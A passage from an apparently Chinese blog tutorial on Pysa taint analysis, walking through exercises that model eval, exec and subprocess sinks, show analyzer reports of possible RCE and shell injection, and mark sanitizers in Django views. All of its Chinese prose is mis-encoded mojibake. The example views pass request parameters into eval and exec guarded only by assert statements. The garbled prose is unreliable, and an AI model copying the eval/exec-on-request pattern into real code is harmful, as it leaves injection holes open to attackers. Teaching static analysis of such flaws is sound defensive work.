çš„ä¸»è¦å­˜æ ¹æ¥è‡ªäº <a href="https://github.com/python/typeshed">typeshed</a>ï¼ˆåŒ…å« Python æ ‡å‡†åº“å’Œ Python å†…ç½®åŒ…çš„å¤–éƒ¨ç±»å‹æ³¨é‡Šï¼Œä»¥åŠé¡¹ç›®å¤–éƒ¨äººå‘˜è´¡çŒ®çš„ç¬¬ä¸‰æ–¹åŒ…ï¼‰ã€‚è¿˜æœ‰ä¸€éƒ¨åˆ†æ˜¯ä¸º Pysa ç¼–å†™çš„å­˜æ ¹ï¼Œæ¶µç›– Django ç­‰ç¬¬ä¸‰æ–¹åº“ï¼Œä¸åŒ…å«åœ¨ typeshed ä¸­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">django.http.request.HttpRequest.GET: TaintSource[CustomUserControlled] &#x3D; ...</span><br><span class="line"></span><br><span class="line">def eval(__source: TaintSink[CodeExecution], __globals, __locals): ...</span><br><span class="line"></span><br><span class="line">def subprocess.getoutput(cmd: TaintSink[ShellExecution]): ...</span><br></pre></td></tr></table></figure><p>æ·»åŠ è§„åˆ™ï¼ŒæŒ‡æ˜ä½¿ç”¨æºç‚¹å’Œæ±‡ç‚¹çš„å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">django.http.request.HttpRequest.POST: TaintSource[CustomUserControlled] &#x3D; ...</span><br><span class="line"></span><br><span class="line">def exec(__source: TaintSink[CodeExecution], __globals, __locals): ...</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>pyre analyze</code> ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise2$ pyre analyze</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `object.__eq__` has 82 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `object.__init__` has 754 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `object.__ne__` has 60 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `type.__call__` has 131 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `type.__init__` has 448 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `type.__new__` has 75 overrides, this might slow down the analysis considerably.</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 30,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 30,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 56,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5002,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5002]: User specified data may reach a shell execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5002]: User specified data may reach a shell execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5002]: User specified data may reach a shell execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_fours&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 22,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 9,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 22,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_threes&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 14,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 14,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="exercise3"><a href="#exercise3" class="headerlink" title="exercise3"></a>exercise3</h2><p>ç›´æ¥è¿è¡Œ <code>pyre analyze</code> æç¤ºæ¨¡å‹éªŒè¯é”™è¯¯ï¼š<a href="https://github.com/facebook/pyre-check/issues/441">Found 93 model verification errors in exercise3 #441</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Æ› Finding taint models <span class="keyword">in</span> `/home/jck/pyre-check/stubs/taint, /home/jck/pyre-check/documentation/pysa_tutorial/exercise3`.Æ› Found 93 model verification errors!</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>æ·»åŠ  <code>--no-verify</code> å‚æ•°å¾—åˆ°é¢„æœŸåé¦ˆï¼Œå­˜åœ¨è¯¯æŠ¥ï¼ˆå‡é˜³ï¼‰é—®é¢˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 9,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_threes&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 24,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 24,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>Pysa ä¸ºè®¸å¤š Python æ ‡å‡†åº“å’Œå¼€æºåº“æä¾›äº†é¢„å…ˆç¼–å†™çš„æºç‚¹ã€æ±‡ç‚¹å’Œè§„åˆ™ã€‚é¢„å…ˆå†™å¥½çš„ <code>taint.config</code> å’Œ <code>*.pysa</code> æ–‡ä»¶åœ¨ <a href="https://github.com/facebook/pyre-check/tree/master/stubs/taint"><code>stubs/taint</code></a> æ–‡ä»¶å¤¹ä¸­ã€‚</p><p>views.py æ‰€æœ‰å‡½æ•°éƒ½æ²¡æœ‰å®‰å…¨é—®é¢˜ï¼Œä½†æ‰§è¡Œ <code>pyre analyze --no-verify</code> å‡ºç°è¯¯æŠ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpRequest, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example_sanitizer</span>():</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_operator_safe</span>(<span class="params">request: HttpRequest</span>) -&gt; str:</span></span><br><span class="line">    operator = request.POST[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    <span class="keyword">assert</span> operator <span class="keyword">in</span> &#123;<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> operator</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_twos</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = get_operator_safe(request)</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;2 <span class="subst">&#123;operator&#125;</span> 2&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_threes</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    <span class="keyword">assert</span> operator <span class="keyword">in</span> &#123;<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>&#125;</span><br><span class="line">    exec(<span class="string">f&quot;result = 3 <span class="subst">&#123;operator&#125;</span> 3&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># noqa: F821</span></span><br></pre></td></tr></table></figure><p>sanitizers.pysa ä¸­å®šä¹‰äº†æ¶ˆæ¯’å™¨ï¼ˆSanitizerï¼‰ï¼Œå®ƒä»¬æ ‡è®°äº† Pysa å¯¹å¾…æ•´ä¸ªå¯è°ƒç”¨å¯¹è±¡çš„æ–¹å¼å˜åŒ–ï¼Œè€Œä¸ä»…ä»…æ˜¯è¿”å›å€¼æˆ–å‚æ•°ï¼Œä½¿ç”¨è£…é¥°å™¨è¡¨ç¤ºæ³¨é‡Šã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Sanitize</span><br><span class="line">def views.example_sanitizer(): ...</span><br></pre></td></tr></table></figure><p>å¯¹äº <code>operate_on_twos</code> å‡½æ•°ï¼Œå› ä¸ºæœ‰è°ƒç”¨ <code>get_operator_safe</code> è¿‡æ»¤è¯·æ±‚ï¼Œæ‰€ä»¥åç»­è°ƒç”¨ <code>eval()</code> ä¹Ÿæ˜¯å®‰å…¨çš„ï¼Œå°† <code>get_operator_safe</code> æ ‡è®°ä¸ºæ¶ˆæ¯’å™¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Sanitize</span><br><span class="line">def views.get_operator_safe(request: TaintSource[UserControlled]): ...</span><br></pre></td></tr></table></figure><p>å†æ¬¡æ‰§è¡Œ <code>pyre analyze --no-verify</code> åªå‰©ä¸€ä¸ªè¯¯æŠ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 9,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_threes&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><code>operate_on_threes</code> å‡½æ•°æœ¬èº«å°±è¿‡æ»¤äº†è¯·æ±‚ï¼Œè¿™é‡Œæ·»åŠ ä¸€ä¸ª identity å‡½æ•°è°ƒç”¨ï¼Œå°†å‚æ•°åŸæ ·è¿”å›ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">identity</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_threes</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    <span class="keyword">assert</span> operator <span class="keyword">in</span> &#123;<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>&#125;</span><br><span class="line">    operator = identity(operator)</span><br><span class="line">    exec(<span class="string">f&quot;result = 3 <span class="subst">&#123;operator&#125;</span> 3&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># noqa: F821</span></span><br></pre></td></tr></table></figure><p>å°† identity å‡½æ•°æ ‡è®°ä¸ºæ¶ˆæ¯’å™¨ï¼ŒæŒ‡æ˜ç»è¿‡è¯¥æ¶ˆæ¯’å™¨çš„æ±¡ç‚¹æºå°±ä¸å†æ˜¯æ±¡ç‚¹æ•°æ®ï¼Œä¸ç”¨ç»§ç»­è·Ÿè¸ªã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Sanitize</span><br><span class="line">def views.identity(x: TaintSource[UserControlled]): ...</span><br></pre></td></tr></table></figure><p>å†æ¬¡æ‰§è¡Œ <code>pyre analyze --no-verify</code>ï¼Œä¸å­˜åœ¨è¯¯æŠ¥äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[]</span></span><br></pre></td></tr></table></figure><h2 id="exercise4"><a href="#exercise4" class="headerlink" title="exercise4"></a>exercise4</h2><p>ä½¿ç”¨ SAPP (Static Analysis Post Processor) æä¾›çš„äº¤äº’å¼å‘½ä»¤è¡Œã€‚</p><p>views.py å‡½æ•°åŒæ ·ä¸å­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œä½†åˆäº§ç”Ÿäº†è¯¯æŠ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpRequest, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example_feature</span>(<span class="params">argument: <span class="built_in">str</span></span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assert_numeric</span>(<span class="params">operand: <span class="built_in">str</span></span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> operand.isnumeric()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_and</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    left = <span class="built_in">bool</span>(request.GET[<span class="string">&quot;left&quot;</span>])</span><br><span class="line">    right = <span class="built_in">bool</span>(request.GET[<span class="string">&quot;right&quot;</span>])</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;<span class="subst">&#123;left&#125;</span> and <span class="subst">&#123;right&#125;</span>&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_or</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    left = request.GET[<span class="string">&quot;left&quot;</span>]</span><br><span class="line">    right = request.GET[<span class="string">&quot;right&quot;</span>]</span><br><span class="line">    assert_numeric(left)</span><br><span class="line">    assert_numeric(right)</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;<span class="subst">&#123;left&#125;</span> or <span class="subst">&#123;right&#125;</span>&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>taint.config ç‰¹å¾ï¼ˆfeatureï¼‰æ˜¯ä¸æ±¡ç‚¹æµç›¸å…³çš„é™„åŠ å…ƒæ•°æ®ï¼Œå¯ç”¨äºè¿‡æ»¤è¯¯æŠ¥ï¼ˆä¸å½±å“åˆ†æï¼‰ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sources&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;sinks&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;example&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;Copy this feature and write your own. Don&#x27;t forget that JSON lists are comma seperated!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rules&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>features.pysa ä½¿ç”¨äº†åç§°ä¸º example çš„ç‰¹å¾ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def views.example_feature(argument: AddFeatureToArgument[Via[example]]): ...</span><br></pre></td></tr></table></figure><p>è¿è¡Œ Pysa å¹¶åœ¨ SAPP ä¸­æ‰“å¼€ç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pyre analyze --no-verify --save-results-to .</span><br><span class="line">sapp analyze taint-output.json</span><br><span class="line">sapp explore</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ SAPP äº¤äº’å¼å‘½ä»¤è¡ŒæŸ¥çœ‹å®‰å…¨é—®é¢˜ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[ run 1 